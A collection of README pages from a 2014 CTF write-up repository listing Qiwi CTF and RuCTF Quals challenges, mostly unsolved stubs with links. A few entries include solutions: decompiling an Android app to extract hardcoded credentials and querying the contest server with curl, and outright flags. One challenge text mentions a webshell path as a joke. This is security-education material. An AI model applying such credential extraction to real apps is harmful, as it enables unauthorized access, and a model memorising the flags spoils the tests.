* <http://nandynarwhals.org/2014/11/15/qiwictf-2014-bajutsu-pwn100/>
# Qiwi CTF 2014: cryptod

**Category:** Pwn
**Points:** 500
**Author:** snk
**Description:**

> Our engineers have deployed the new version of HSM.
>
> host qiwictf2014.ru port 3671
>
> <https://qiwictf2014.ru/files/cryptod>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Easydroid

**Category:** Forensic
**Points:** 200
**Author:** tracer0tong
**Description:**

> This is a new version of [payment application](android200.apk).
>
> It works, but we’ve 5$ only?! Cool hackers should have a cool account!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: GOREX

**Category:** Binary
**Points:** 400
**Author:** pzbitskiy
**Description:**

> Trade and buy the flag!
>
> File: [GOREX binary](gorex)
>
> Market is open on port 3333 at qiwictf2014.ru

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Guessing Game

**Category:** Ucucuga
**Points:** 200
**Author:** vos
**Description:**

> A long-awaited guessing task!
>
> <https://qiwictf2014.ru:3219/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Hidden

**Category:** Ucucuga
**Points:** 10
**Author:** qiwi
**Description:**

> Try to find the hidden flag

## Write-up

The flag was shown on one of the slides at the main event, ([ZeroNights Conference 2014](http://2014.zeronights.org/)). It was `ZN2014_md5(qiwi)` which is `ZN2014_a37ee3c05defee325d0d57689e294623`.

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Milk Road

**Category:** Web
**Points:** 150
**Author:** babayaga
**Description:**

> Capture the flag!
>
> <https://qiwictf2014.ru:16443/>

## Write-up

The URL in the description points to a web shop where you can register, log in, and buy items. The `/robots.txt` file reveals:

```
User-agent: *
Disallow: /templates/
```

Sure enough, <https://qiwictf2014.ru:16443/templates/> contains an open directory listing with six HTML templates. Let’s download them:

```bash
$ wget -r https://qiwictf2014.ru:16443/templates/
```

The templates are available in [the `templates` folder within this repository](templates). It looks like `shop.html` contains some conditional logic to display the flag:

```html
{% if flag %}
<h1>{{ flag }}</h1>
{% else %}
<tr>
<form method="post" action="">
<td>
<input type="hidden" name="item_id" value="31337">
<img src="/static/WMHlogoweb.gif" width="300px">
</td>
<td>$2048</td>
<td><input type="submit" value="Buy"></td>
</form>
</tr>
{% endif %}
```


https://qiwictf2014.ru:16443/templates/
https://qiwictf2014.ru:16443/templates/

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Milk Road Mystery

**Category:** Web
**Points:** 300
**Author:** babayaga
**Description:**

> Buy the flag!
>
> <https://qiwictf2014.ru:16443/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: monitord 1

**Category:** Pwn
**Points:** 100
**Author:** snk
**Description:**

> We have intercepted an interesting mail message:
>
> ```
> > Date: Wed, 12 Nov 2014 11:58:33 +0000
> > From: "Security"
> > Reply-To: "[Masked]"
> > Subject: Bug Bounty
> >
> > Thank you for helping, but we compile
> > all software with FORTIFY_SOURCE=2,
> > so we're safe.
> >
> > > Hey, I found a format string bug
> > > at one of your services:
> > > https://qiwictf2014:8443/
> > >
> ```
>
> This is a three stage task: [level2](https://github.com/ctfs/write-ups/tree/master/qiwi-ctf-2014/monitord-2) and [level3](https://github.com/ctfs/write-ups/tree/master/qiwi-ctf-2014/monitord-3)
>
> P.S. It’s not a web challenge, scanners has no effect and no guessing.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: monitord 2

**Category:** Binary
**Points:** 300
**Author:** snk
**Description:**

> First solve [monitord 1](https://github.com/ctfs/write-ups/tree/master/qiwi-ctf-2014/monitord-2) and submit the **second** flag here.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: monitord 3

**Category:** Pwn
**Points:** 300
**Author:** snk
**Description:**

> First solve [monitord 1](https://github.com/ctfs/write-ups/tree/master/qiwi-ctf-2014/monitord-2) and submit the **third** flag here.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: MSR

**Category:** Binary
**Points:** 300
**Author:** pzbitskiy
**Description:**

> Read Me!
>
> File: [MSR binary](msr.tgz)

## Write-up

(TODO)

```bash
$ ./msr dump.msr
terminate called after throwing an instance of 'std::runtime_error'
  what():  Parity check failed
%A6759384105970000221^643^MR.DR.SR ZOHER/HACKERIVECH^1411^111^22222^123456789?X(Aborted (core dumped)
```

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: No poodles involved!

**Category:** Crypto
**Points:** 100
**Author:** babayaga
**Description:**

> ChihuahuA. Italian Kangal Papillon. Get the flag!
>
> <https://qiwictf2014.ru:15443/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Not so one time…

**Category:** Misc
**Points:** 300
**Author:** tracer0tong
**Description:**

> Ok, new version? [Yes](android300.apk), they decided to realize OTP here, but something goes wrong.
>
> Alright, when we **get 31337 $** that will teach them!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: PaaS

**Category:** Crypto
**Points:** 300
**Author:** vos
**Description:**

> Eval some code!
>
> https://forkbomb.ru/

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014: Phantom of the Milk Road

**Category:** Web
**Points:** 100
**Author:** babayaga
**Description:**

> Capture the flag (another one)!
>
> <https://qiwictf2014.ru:16443/>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Qiwi CTF 2014 write-ups

* <https://qiwictf2014.ru/>
* [Scoreboard](https://qiwictf2014.ru/scoreboard) or [local alternative](scoreboard.txt)

## Completed write-ups

* [Hidden](hidden)
* [Stolen prototype](stolen-prototype)

## External write-ups only

* [Bajutsu](bajutsu)

## Missing write-ups

* [cryptod](cryptod)
* [Easydroid](easydroid)
* [GOREX](gorex)
* [Guessing Game](guessing-game)
* [Milk Road Mystery](milk-road-mystery)
* [Milk Road](milk-road)
* [monitord 1](monitord-1)
* [monitord 2](monitord-2)
* [monitord 3](monitord-3)
* [MSR](msr)
* [No poodles involved!](no-poodles-involved)
* [Not so one time…](not-so-one-time)
* [PaaS](paas)
* [Phantom of the Milk Road](phantom-of-the-milk-road)
* [The Ultimate Task](the-ultimate-task)
# Qiwi CTF 2014: Stolen prototype

**Category:** Misc
**Points:** 100
**Author:** tracer0tong
**Description:**

> This is a [stolen application](android100.apk) of super-duper payment system.
>
> But this is broken piece of cake, completely broken =(

## Write-up

[The provided `android100.apk` file](android100.apk) is an Android application package file. `*.apk` files are essentially ZIP files with a different extension. Extracting it reveals (among other things) a `classes.dex` file. `*.dex` files are compiled Android application code files, containing bytecode for the Dalvik Virtual Machine (the workhorse powering the Android system).

Let’s convert the bytecode in the `classes.dex` file back to a `*.jar` file [using `dex2jar`](https://code.google.com/p/dex2jar/):

```bash
$ d2j-dex2jar android100.apk
dex2jar android100.apk -> android100-dex2jar.jar
```

Fun fact: `*.jar` files are essentially ZIP files too. We can just rename `numdroid-dex2jar.jar` to `numdroid-dex2jar.jar.zip` and unzip it to unpack its contents. Alternatively, this command has the same result:

```bash
$ jar xf android100-dex2jar.jar
```

In this case, the resulting source files aren’t easily readable, so let’s use a decompiler. Open `android100-dex2jar.jar` in [JD-GUI](http://jd.benow.ca/). Now we can view all the source code, or go to _File_ → _Save All Sources_ to save the sources so we can view them in our preferred text editor.

The source code of the `com/mslc/ctf/piwiotp/Account.java` class reveals that the app makes an HTTP request. Here’s the code with added comments:

```java
private String a() {
  Character localCharacter = Character.valueOf('n'); // 'n'
  String str1 = this.d.substring(0, 1); // 'h'
  Log.d(getPackageName(), str1);
  // → D/com.mslc.ctf.piwiotp(15685): h
  StringBuilder localStringBuilder = new StringBuilder();
  DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
  String str2 = str1 + "vty"; // 'hvty'
  Log.d(getPackageName(), localCharacter + "s" + str2 + "f" + localCharacter + "j" + str1);
  // → D/com.mslc.ctf.piwiotp(15685): nshvtyfnjh

  UsernamePasswordCredentials localUsernamePasswordCredentials = new UsernamePasswordCredentials("xxx", localCharacter + "s" + str2 + "f" + localCharacter + "j" + str1);
  // → username is `xxx` and password is `nshvtyfnjh`

  HttpGet localHttpGet = new HttpGet("https://qiwictf2014.ru:54321/account?key=" + "" + "&account=" + "afgssdfgsdgsfgdfbxcbsdbkjnkwej");
  try {
    localHttpGet.addHeader(BasicScheme.authenticate(localUsernamePasswordCredentials, "UTF-8", false));
    HttpResponse localHttpResponse = localDefaultHttpClient.execute(localHttpGet);
    if (localHttpResponse.getStatusLine().getStatusCode() == 200) {
      // …
    }
  } catch (…) {
    // …
  }
}
```

Note that any calls to `Log.d()` can be inspected while running the app by using [`adb logcat`](https://developer.android.com/tools/help/logcat.html).

As the challenge description indicates, the app is broken: the HTTP request fails, and therefore the response is never displayed. Let’s recreate the request and see what we can do about that.

The above code reveals that a request is made to `https://qiwictf2014.ru:54321/account?key=&account=afgssdfgsdgsfgdfbxcbsdbkjnkwej` using Basic Authentication with username `xxx` and password `nshvtyfnjh`.

```bash
$ curl -u 'xxx:nshvtyfnjh' 'https://qiwictf2014.ru:54321/account?key=&account=afgssdfgsdgsfgdfbxcbsdbkjnkwej'
curl: (7) Failed to connect to qiwictf2014.ru port 54321: Connection refused
```

Elsewhere in the code, we find another port on the same host:

```java
protected void onCreate(Bundle paramBundle) {
  super.onCreate(paramBundle);
  StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
  Random localRandom = new Random();
  String str = "ctf201" + "444444".charAt(localRandom.nextInt("444444".length()));
  // Note the next line:
  this.d = ("https://qiwi" + str + ".ru:" + "40443");
  setContentView(2130903040);
  this.b = ((TextView)findViewById(2131230723));
  this.c = ((Button)findViewById(2131230728));
  this.c.setOnClickListener(new a(this));
  Log.d(getPackageName(), "Init for:https://qiwictf2014.ru:54321" + a());
}
```

So let’s try accessing port `40443` instead:

```bash
$ curl -u 'xxx:nshvtyfnjh' 'https://qiwictf2014.ru:40443/account?key=&account=afgssdfgsdgsfgdfbxcbsdbkjnkwej'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>
```

Hmm, we still get an error, but at least the connection succeeds. Let’s request the main page (`/`):

```bash
$ curl -u 'xxx:nshvtyfnjh' 'https://qiwictf2014.ru:40443/'
{"status": 405, "message": "Method Not Allowed"}
```

Since `GET` is not allowed, let’s try `POST`:

```bash
$ curl -X POST -u 'xxx:nshvtyfnjh' 'https://qiwictf2014.ru:40443/'
{"welldone": "ZN2014_3db056df7036e11c823707f5adf923e9"}
```

The flag is `ZN2014_3db056df7036e11c823707f5adf923e9`.

## Other write-ups and resources

* <http://nandynarwhals.org/2014/11/14/qiwictf2014-stolen-prototype-misc100/>
# Qiwi CTF 2014: The Ultimate Task

**Category:** Web
**Points:** 300
**Author:** vos
**Description:**

> Congratulations, pwner! You have succeeded in every web challenge we gave you. The time has come. This is the final task. NO LIVING PERSON ON THE EARTH will be able to accomplish all the stages and capture the Ultimate Flag.
> You should start with the following page:
> <https://qiwictf2014.ru:17443/>
>
> Work your way through in a usual REPL fashion (Recon → Exploit → Proceed Loop).
> On your journey through this system, you will need to read tens of thousands of PHP code lines, find a 0-day bug inside a common off-the-shelf forum engine, make use of Remote Cross-Site SQL Buffer Off-by-one Injection Disclosure Overflow to circumvent the Linux FS driver restrictions which will allow you to upload a webshell and execute arbitra2y code, then you elevate your privilEGES`AND`GAin access to the ppp.}|recious flag -- in ouieR words@ YPu WILLNEVR`soLVE THIB‘V*оТQ Ў2IҐ
> -->
> Notice: Undefined index: serialport_debug in /ctf/qiwi2014/tasks/ultimate_task.php on line 183
>
> Notice: Array to string conversion in /ctf/qiwi2014/core/TaskController.php on line 1402
>
> ```
> hey psst, kid.
> fuck those MSLC with their no-lifer ctf challenges. we have already rooted that qiwi ctf (don't tell anyone!) -- we like you, here you have a shortcut through the task.
> grab flag in / and make away as fast as you can
>
> https://qiwictf2014.ru:17443/ips_kernel/PEAR/Text/Diff/
> Renderer/wso2_pack.php
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# CTF write-ups 2014

There are some problems with [CTF](https://ctftime.org/ctf-wtf/) write-ups in general:

* they’re scattered across the interwebs
* they don’t usually include the original files needed to solve the challenge
* some of them are incomplete or skip ‘obvious’ parts of the explanation, and are therefore not as helpful for newcomers
* often they disappear when the owner forgets to renew their domain or shuts down their blog

This repository aims to solve those problems.

It’s a collection of CTF source files and write-ups that anyone can contribute to. Did you just publish a CTF write-up? [Let us know](https://github.com/ctfs/write-ups/issues/new), and we’ll add a link to your post — or just add the link yourself and submit a pull request. Spot an issue with a solution? Correct it, and send a pull request.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md).

## Archive

* [Write-ups for CTFs that occurred in 2013](https://github.com/ctfs/write-ups-2013)
* [Write-ups for CTFs that occurred in 2014](https://github.com/ctfs/write-ups-2014) (this repository)
* [Write-ups for CTFs that occurred in 2015](https://github.com/ctfs/write-ups-2015)
* [Write-ups for CTFs that occurred in 2016](https://github.com/ctfs/write-ups-2016)
# RuCTF 2014 Quals: Admin 100 - [Iip](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/iip)

> [Look at my site](ibshMg9zLWqoXffZVRtllBLlH3SILmo0JCl8Y3nZz3muuy~JX6yfkqncKStKcNk13e4skhJeg4~RWcOlI0erE35xxTxfK~bFNQ0Z4sWxvtPwl9NKteKlzTVaXLyEnigASFBG~Vf1FuZt7QYToy5dW~vjr6THGKoebv0s4LJCAgu8mxhEZaKkk1IONwfi-NWqBKeF~h4p4OHedO65CUVByrJDpkIw7yqhg~ZGNHO63CpbTyrbswW3rkePrBYLZv8ScuNSweI-GcVZNQI2enwLSvLhwytJ~gjrUnXFroAauMc4ueqn9pThwZnLpeab1ROQOE49GgXe5Avw17RoMQ~rpz2xCBvaN~p4bzPydQxcZW8Gduqje-TmA5n7AbbtnLvsso~0ZW8mFoTeGVRhdeCzZv4J~MBWWxBl9OFS-hpDbksPDSS-2Ct0hnGhRCJTepQ5jhq2Fno9glI8eZa46BBasLFOlTgmo6x~diWYgSftGtz3RbpqLKkom904-4XY686ZAAAA)
> Flag format: RUCTF\_.\*

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-admin-100/>
* <http://lights-out-ctf.ghost.io/ructf-quals-2014-admn-100-iip/>
# RuCTF 2014 Quals: Admin 200 - [Simulator](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/simulator)

> Help the administrator to configure the [network](network.tar.gz)
> Which command is skipped on R1?

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-for200-and-admin200-writeup/>
* <http://h34dump.com/2014/03/ructf-quals-2014-admin-200/>
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-admin-200-troubleshooting/>
* <https://hackucf.org/blog/admin-200/>
# RuCTF 2014 Quals: Admin 300 - [Floppy](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/floppy)

> [Find the key](task.ima).
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Admin 400 - [Compile](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/compile)

> [Compile me.](source)
> Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <http://sibears.ru/labs/ructf_2014_quals_admin_400_write_up/>
* <http://www.suslopas.pw/2014/03/ructf-admin-400-compile.html>
# RuCTF 2014 Quals: Crypto 100 - [Md5 lext](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/md5_lext)

> Server (python27.quals.ructf.org:12337) accepts only authorized messages.
> It works like this:
>
<pre>
-------------------------------
	buf = c.recv(4096)
	digest, msg = buf.split(" ", 1)
	if (digest == md5(password+msg).hexdigest()):
		#here I send a secret
	else:
		c.send("Wrong signature\n")
-------------------------------
</pre>
>
> You have intercepted one authorized message: "b34c39b9e83f0e965cf392831b3d71b8 do test connection". Construct your own authorized message! Answer starts with 'RUCTF\_'

## Other write-ups and resources

* <http://xrekkusu.hatenablog.jp/entry/2014/03/11/214753>
* <https://ctfcrew.org/writeup/54>
* [Japanese](http://d.hatena.ne.jp/kusano_k/20140310/1394471922)
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-crypto-100-md5/>
* <http://www.suslopas.pw/2014/03/ructf-crypto-100-md5.html>
# RuCTF 2014 Quals: Crypto 200 - [Mary](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/mary)

> Mary Queen of Scots goes chinese. We [capture](queen_mary.txt) secret message from prison where Mary Queen stands. Help us figure out what message means.

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-crypto-200/>
* <http://quangntenemy.blogspot.in/2014/03/ructf-quals-2014.html>
* [Japanese](http://xrekkusu.hatenablog.jp/entry/2014/03/11/224338)
# RuCTF 2014 Quals: Crypto 300 - [Ssl](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/ssl)

> Just hack [TLS](dump.pcap).
> Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/03/ructf-2014-quals-tls-crypto-300.html>
# RuCTF 2014 Quals: Crypto 400 - [Ructfcoin](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/ructfcoin)

> Check out our new cryptocurrency <https://github.com/HackerDom/bitcoin>
> Mine and send us 10000 coins to __address__ address and we'll score you points. You can use ANYTHING as an answer. For example, hash of money transfer transaction.

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Crypto 500 - [Related](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/related)

> Two agents, Alex and Jane, have simultaneously known very secret message and transmitted it to Center. You know following:
> 1) They used RSA with [this public key](key.pub)
> 2) They sent exactly the same messages except the signatures (name appended, eg. "[message]Alex")
> 3) They did encryption this way:
>	c, = pubKey.encrypt(str\_to\_num(message), 1) # using RSA from Crypto.PublicKey
>	c = num\_to\_str(c).encode('hex')
> 4) And here are cryptograms you have intercepted:
>
> "61be5676e0f8311dce5d991e841d180c95b9fc15576f2ada0bc619cfb991cddfc51c4dcc5ecd150d7176c835449b5ad085abec38898be02d2749485b68378a8742544ebb8d6dc45b58fb9bac4950426e3383fa31a933718447decc5545a7105dcdd381e82db6acb72f4e335e244242a8e0fbbb940edde3b9e1c329880803931c"
>
> "9d3c9fad495938176c7c4546e9ec0d4277344ac118dc21ba4205a3451e1a7e36ad3f8c2a566b940275cb630c66d95b1f97614c3b55af8609495fc7b2d732fb58a0efdf0756dc917d5eeefc7ca5b4806158ab87f4f447139d1daf4845e18c8c7120392817314fec0f0c1f248eb31af153107bd9823797153e35cb7044b99f26b0"
>
> Now tell me that secret message! (The answer for this task starts from 'ructf\_')

## Other write-ups and resources

* <https://rdot.org/forum/showthread.php?t=3053&langid=1>
* <http://ahack.ru/write-ups/ructf-quals-14.htm>
* <http://hxp.io/blog/1/RuCTF%20Quals%202014:%20crypto500%20%22decrypt%20message%22/>
* <http://www.suslopas.pw/2014/03/ructf-crypto-500-decrypt-message.html>
# RuCTF 2014 Quals: Forensics 100 - [Openvpn\_dump](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/openvpn_dump)

> We intercepted [configs and dump](openvpn.5df2789228a89cdcd1ff58e3e650df0f.7z). What were they hide on [http://10.100.0.1/](http://10.100.0.1/)?

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-forensics-100/>
* <http://peterpen-ctf.net/?p=915>
* <http://ctfwriteups.blogspot.in/2014/03/ructf-2014-quals-forensics-100-secret.html>
* <https://ctfcrew.org/writeup/49>
* <http://nullify-ctf.blogspot.in/2014/03/ructf-quals-2014-stegano-100-cats-eye.html>
# RuCTF 2014 Quals: Forensics 200 - [Nosql](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/nosql)

> We have some [corrupted files](nosql.7a213eefd016dadea7e9d793271ad504.zip). Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <http://tasteless.eu/2014/03/ructf-quals-2014-for200-and-admin200-writeup/>
* <http://h34dump.com/2014/03/ructf-quals-2014-forensics-200/>
* [Russian](http://akaminsky.net/ructf-2014-forensics-200-nosql/)
# RuCTF 2014 Quals: Forensics 300 - [Random](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/random)

> A friend of mine developed a [special application](main.cpp) to store sensitive information. He was very confident to gave me his [secret](secret), claiming it's safe. I'm not that sure. Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Forensics 400 - [Virtual](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/virtual)

> The answer is [here.](answer.ova)
> Flag format is "RUCTF\_.\*".

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-forensics-400/>
* <http://peterpen-ctf.net/?p=899>
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-forensics-400-so-close/>
# RuCTF 2014 Quals: Hardware 100 - [IR dump](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/ir_dump)

> What credit card number has been typed? [Dump](dump.fcca5cbe12a7115b74c550c3ee09a2f7.zip)

## Other write-ups and resources

* [Japanese](http://d.hatena.ne.jp/waidotto/20140310/1394477767)
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-hardware-100.html)
* [Russian](http://www.suslopas.pw/2014/03/ructf-irdump.html)
# RuCTF 2014 Quals: Hardware 200 - [HW Reverse](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/hw_reverse)

> What is the shortest valid code? [Files](https://github.com/HackerDom/ructf-2014-quals/blob/master/tasks/hw_reverse/static/hw_reverse.79377a87bcbe15a55d5b04fe5b8778eb.zip). Attention: you have 70 attempts.

## Other write-ups and resources

* [Japanese](http://d.hatena.ne.jp/waidotto/20140310/1394481816)
* [Russian](http://www.suslopas.pw/2014/03/ructf-hwreverse.html)
# RuCTF 2014 Quals: Hardware 300 - [ADC](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/adc)

> [Find the key](http://quals.ructf.org:22222/?key=%HASH%&amp;delay=1&amp;count=10).

## Other write-ups and resources

* none yet
# RuCTF 2014 Quals: Hardware 400 - [MC](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/mc)

> We have a [special device](mc.b8e612ed6c296b76cd213f21bdc9e2f3.zip) for converting numbers into images. Can you tell us which keys did we press?

## Other write-ups and resources

* <https://stratum0.org/blog/posts/2014/03/11/ructf-quals-2014-microcontroller/>
# RuCTF 2014 Quals: Misc 100 - [Shredder](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/shredder)

> [Find the key](shredder.af3ab921a9895c1aa9c032a37677e1d7.jpg)
> Flag format is "RUCTF\_.\*"


## Writeup

The easiest way to approach this is to go old-school and do it by hand. After a bit of tedious work, it should look something like this:

![](shredder.jpg)

The flag is `RUCTF_TO_SHRED_IS_NOT_ENOUGH`.

## Other write-ups and resources

* <http://nullify-ctf.blogspot.in/2014/03/ructf-quals-misc-100-shredder-writeup.html>
* <https://ctfcrew.org/writeup/40>
* [Japanese](http://d.hatena.ne.jp/kusano_k/20140310/1394471922)
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-misc-100-shredder-misc-200-ructf-radio/>
* <http://www.suslopas.pw/2014/03/ructf-misc-100.html>
# RuCTF 2014 Quals: Misc 200 - [Radio](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/radio)

> Just listen our [radio](http://myradiostream.com/ructf).

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-misc-200/>
* <http://ctfwriteups.blogspot.in/2014/03/ructf-2014-quals-misc-100-shredder-misc.html#more>
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-misc-100-shredder-misc-200-ructf-radio/>
# RuCTF 2014 Quals: Misc 300 - [Bluetooth dump](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/bluetooth_dump)

> [Eavesdrop me](task.ef5984bcf6beb5511120fae48b89cf74).

## Other write-ups and resources

* <http://translate.google.com/translate?sl=ko&tl=en&u=http://blackcon.tistory.com/97>
* <http://h34dump.com/2014/03/ructf-quals-2014-misc-300/>
* [Korean](http://blackcon.tistory.com/97)
# RuCTF 2014 Quals: Misc 500 - [GSM](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/gsm)

> [Find the key](https://github.com/HackerDom/ructf-2014-quals/blob/master/tasks/gsm/static/0d6d6b808766f952a6c20e07de45f94a/GSM.4ac71c244a9a5b7537cb0fd618df249c.zip).
> Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <http://piggybird.net/2014/03/ructf-2014-quals-misc-500-gsm-writeup/>
* <http://sibears.ru/labs/RuCTF-2014-Quals-Misc-500-GSM-Write-up/>
# RuCTF 2014 Quals: PPC 200 - [Maze](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/maze)

> Universal dangerous positive: 194.226.244.125:1024. Send me your password: "3k8bbz032mrap75c8iz8tmi7f4ou00". Flag format is "RUCTF\_.\*" 

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-ppc-200/>
* <http://nullify-ctf.blogspot.in/2014/03/ructf-quals-2014-ppc-200-maze.html>
* <https://ctfcrew.org/writeup/39>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-ppc-200-maze.html)
# RuCTF 2014 Quals: PPC 300 - [Bio](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/bio)

> Guys, we were happy to get a Moomin's DNA! And we wonder, what substring is the origin of replication in the Moomin's DNA? Could you help us?
> The only thing we know that it has length of 32. Find it in the [code](https://github.com/HackerDom/ructf-2014-quals/blob/master/tasks/bio/static/word.gz).

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-ppc-300/>
* <https://ctfcrew.org/writeup/50>
* <http://lights-out-ctf.ghost.io/ructf-2014-quals-ppc-300-secret-string/>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-ppc-300-secret.html)
# RuCTF 2014 Quals: PPC 400 - [Minesweeper](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/minesweeper)

> Can you crack the world record for solving the old kind [minesweeper](http://saper.quals.ructf.org/)? Several times successively :)
> Flag format is "RUCTF\_.\*"

## Other write-ups and resources

* <https://gist.github.com/tyage/9466865>
# RuCTF 2014 Quals write-ups

* [Scoreboard](scoreboard.txt)
* [RuCTF Quals](http://quals.ructf.org/)
* [RuCTF Tasks](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks)

## Completed write-ups

* [Misc 100](misc-100)

## External write-ups only

* [Admin 100](admin-100)
* [Admin 200](admin-200)
* [Admin 300](admin-300)
* [Admin 400](admin-400)
* [Crypto 100](crypto-100)
* [Crypto 200](crypto-200)
* [Crypto 300](crypto-300)
* [Crypto 400](crypto-400)
* [Crypto 500](crypto-500)
* [Forensics 100](forensics-100)
* [Forensics 200](forensics-200)
* [Forensics 300](forensics-300)
* [Forensics 400](forensics-400)
* [Hardware 100](hardware-100)
* [Hardware 200](hardware-200)
* [Hardware 300](hardware-300)
* [Hardware 400](hardware-400)
* [Misc 200](misc-200)
* [Misc 300](misc-300)
* [Misc 500](misc-500)
* [PPC 200](ppc-200)
* [PPC 300](ppc-300)
* [PPC 400](ppc-400)
* [Recon 100](recon-100)
* [Recon 200](recon-200)
* [Recon 300](recon-300)
* [Recon 400](recon-400)
* [Recon 500](recon-500)
* [Reverse 10](reverse-10)
* [Reverse 100](reverse-100)
* [Reverse 200](reverse-200)
* [Reverse 300](reverse-300)
* [Reverse 400](reverse-400)
* [Reverse 500](reverse-500)
* [Stegano 100](stegano-100)
* [Stegano 200](stegano-200)
* [Stegano 300](stegano-300)
* [Stegano 400](stegano-400)
* [Stegano 500](stegano-500)
* [Vuln 100](vuln-100)
* [Vuln 200](vuln-200)
* [Vuln 300](vuln-300)
* [Vuln 400](vuln-400)
* [Vuln 500](vuln-500)
* [Web 100](web-100)
* [Web 200](web-200)
* [Web 300](web-300)
* [Web 400](web-400)
* [Web 500](web-500)

## Missing write-ups

* [Admin 300](admin-300)
* [Crypto 400](crypto-400)
* [Forensics 300](forensics-300)
* [Hardware 300](hardware-300)
* [Reverse 100](reverse-100)
* [Stegano 500](stegano-500)
* [Vuln 400](vuln-400)
* [Vuln 500](vuln-500)
* [Web 500](web-500)
# RuCTF 2014 Quals: Recon 100 - [Favourite book](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/favourite_book)

> Have you ever met Olimpiada Balalaykina?
> She is a young girl who likes to chat and dreams to meet Pavel Durov.
> We'd like to know her favorite book.

## Writeup

(TODO)

## Other write-ups and resources

* <http://h34dump.com/2014/03/ructf-quals-2014-recon-100/>
* <http://onthesystemsoftheworld.blogspot.in/2014/03/ructf-2014-qualifiers-recon-100300400.html>
* <https://ctfcrew.org/writeup/42>
* [Japanese](http://xrekkusu.hatenablog.jp/entry/2014/03/11/143840)
* <http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-100_19.html>
* [Russian](http://singularityctf.blogspot.de/2014/03/ructf-quals-2014-writeup-recon-100.html)
* <https://hackucf.org/blog/recon-100/>
* <http://lights-out-ctf.ghost.io/ructf-quals-2014-recon-100-favourite-book/>
# RuCTF 2014 Quals: Recon 200 - [Stolen camera](https://github.com/HackerDom/ructf-2014-quals/tree/master/tasks/stolen_camera)

> Have you ever met Olimpiada Balalaykina?
> She is a young girl who likes to chat and dreams to meet Pavel Durov.
